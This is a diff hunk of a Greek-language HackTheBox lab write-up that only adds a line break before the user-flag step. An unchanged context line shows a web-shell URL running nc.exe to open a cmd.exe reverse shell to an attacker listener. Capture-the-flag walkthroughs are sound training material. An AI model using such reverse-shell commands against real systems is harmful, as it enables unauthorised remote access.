@@ -56,7 +56,7 @@
 ```10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.14.41 9003 -e cmd.exe```
 ![browservs](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/browser%20reverse%20shell.png?raw=true)
 <br>
-Και μετα βρίσκουμε το user.txt
+<br>Και μετα βρίσκουμε το user.txt
 ![userflag](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/userflag.png?raw=true)
 
 ![userflag2](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/userflagtxt.png?raw=true)
